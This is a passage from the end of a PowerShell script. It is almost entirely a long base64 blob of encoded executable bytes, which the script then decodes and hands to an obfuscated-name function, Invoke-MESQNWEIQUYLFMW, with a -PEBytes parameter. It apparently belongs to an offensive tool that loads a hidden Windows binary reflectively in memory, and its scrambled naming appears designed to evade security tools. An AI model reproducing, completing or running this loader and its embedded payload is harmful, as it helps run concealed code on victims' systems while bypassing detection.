AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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"
[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
Invoke-MESQNWEIQUYLFMW -PEBytes $PEBytes

}